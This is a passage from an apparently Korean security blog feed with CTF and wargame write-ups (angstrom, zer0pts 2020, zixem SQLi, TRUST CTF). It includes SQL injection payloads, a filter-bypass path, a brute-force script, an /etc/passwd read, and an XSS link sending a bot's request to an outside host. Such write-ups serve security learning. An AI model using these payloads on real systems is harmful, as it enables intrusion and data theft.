class="string">&quot;nofret()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:150px; width:150px;&quot;</span>&gt;</span>pay me some money<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nofret</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>[_0x4229(<span class="string">&#x27;0x95&#x27;</span>,<span class="string">&#x27;kY1#&#x27;</span>)](_0x4229(<span class="string">&#x27;0x9&#x27;</span>,<span class="string">&#x27;kY1#&#x27;</span>))[_0x4229(<span class="string">&#x27;0x32&#x27;</span>,<span class="string">&#x27;yblQ&#x27;</span>)]=<span class="built_in">parseInt</span>(<span class="built_in">document</span>[_0x4229(<span class="string">&#x27;0x5e&#x27;</span>,<span class="string">&#x27;xtR2&#x27;</span>)](_0x4229(<span class="string">&#x27;0x2d&#x27;</span>,<span class="string">&#x27;uCq1&#x27;</span>))[<span class="string">&#x27;innerHTML&#x27;</span>])+<span class="number">0x19</span>;<span class="built_in">console</span>[_0x4229(<span class="string">&#x27;0x14&#x27;</span>,<span class="string">&#x27;70CK&#x27;</span>)](_0x4229(<span class="string">&#x27;0x38&#x27;</span>,<span class="string">&#x27;rwU*&#x27;</span>));<span class="built_in">console</span>[<span class="string">&#x27;clear&#x27;</span>]();&#125;</span><br></pre></td></tr></table></figure><p>[_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid)</p><p>순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고,</p><p>콘솔에서 실행시키면 플래그를 얻을 수 있다.</p><hr><h3 id="4-WEB-Git-Good"><a href="#4-WEB-Git-Good" class="headerlink" title="4. [WEB - Git Good]"></a>4. [WEB - Git Good]</h3><p>아무것도 없는 Hello world 출력만 된 페이지이다,</p><p>문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다.</p><p>git clone <a href="https://gitgood.2020.chall.actf.co/.git/">https://gitgood.2020.chall.actf.co/.git/</a></p><p>해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다,</p><p>그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--- a&#x2F;thisistheflag.txt</span><br><span class="line">+++ b&#x2F;thisistheflag.txt</span><br><span class="line">@@ -1,3 +1 @@</span><br><span class="line">-actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5-WEB-Secret-Agents"><a href="#5-WEB-Secret-Agents" class="headerlink" title="5. [WEB - Secret Agents]"></a>5. [WEB - Secret Agents]</h3><p>처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다.</p><p>user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다.</p><p>결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts 2020 Write up</title>
      <link href="2020/04/10/zer0ptsctf-200410/"/>
      <url>2020/04/10/zer0ptsctf-200410/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데,</p><p>정규식 표현으로 입력값 필터링을 하고 있다.</p><p>그런데 php 에서 basename 함수는 문자 \x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다.</p><p><code> index.php/config.php/%80?source </code></p><hr><h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = async (url) =&gt; &#123;</span><br><span class="line">    console.log(`[+] Query! ($&#123;url&#125;)`);</span><br><span class="line">    <span class="keyword">const</span> page = await browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        await page.setUserAgent(flag);</span><br><span class="line">        await page.<span class="keyword">goto</span>(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        await page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    await page.close();</span><br><span class="line">    console.log(`[+] Done! ($&#123;url&#125;)`)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>문제에 보면 게시글을 올릴 수 있는 기능이 있다.</p><p>그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다.</p><p>그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">      &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">      &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다.</p><p>로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때</p><p>리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 입력값 필터링이 걸려 있다.</p><p>그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면</p><p>audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다.</p><p>즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio href=&#x27;myip.kr:12345&#x27; id=&#x27;like&#x27;&gt;like</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zixem challenge Write up</title>
      <link href="2020/04/10/zixemchall-200410/"/>
      <url>2020/04/10/zixemchall-200410/</url>
      
        <content type="html"><![CDATA[<p>Site : <a href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p><hr><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showprofile<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span>unionon<span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ebookid<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,version(),<span class="number">5</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">param = <span class="string">&quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">r = requests.get(param)</span><br><span class="line"><span class="built_in">print</span> param</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Brute Force&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found key: &quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serial<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>id,teacher,teacher_age,price<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>teachers<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>id<span class="operator">=</span><span class="number">11</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span>seselectlect<span class="operator">%</span><span class="number">091</span>,version(),<span class="number">3</span>;<span class="comment">--%09-</span></span><br></pre></td></tr></table></figure><hr><h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>&quot;../etc/passwd&quot;,<span class="number">2</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul><li>php uuencode -&gt; base64 encode</li></ul><p>x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
      
      
      <categories>
          
          <category> Wargame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TRUST CTF 2019 Write up</title>
      <link href="2020/02/23/trustctf-200223/"/>
      <url>2020/02/23/trustctf-200223/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-ezrc"><a href="#1-web-ezrc" class="headerlink" title="1. (web) ezrc"></a>1. (web) ezrc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: ./login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;source.php&quot;</span>&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select pw from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">    <span class="variable">$pw</span> = <span class="variable">$idx</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$print_query</span> = <span class="string">&quot;select chk from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$hehe_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;<span class="subst">$hehe</span>&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$reset_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;nope&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your id is &quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])&gt;<span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$print_query</span>);</span><br><span class="line">        <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;your chk is &quot;</span>.<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>] == <span class="variable">$hehe</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;congratulations&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_query(<span class="variable">$con</span>, <span class="variable">$hehe_query</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;trust_is_very_cooool&quot;</span>;</span><br><span class="line">    <span class="variable">$t</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;times&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pw</span> == md5(<span class="number">240610708</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pw right&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$t</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="variable">$t</span>; <span class="variable">$j</span>=<span class="variable">$j</span>+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> == <span class="string">&quot;d91a2796ab967c9793ef1c628a91fac5&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>레이스 컨디션(race condition) 을 이용하는 문제이다.</p><p>서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다.</p><p>CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 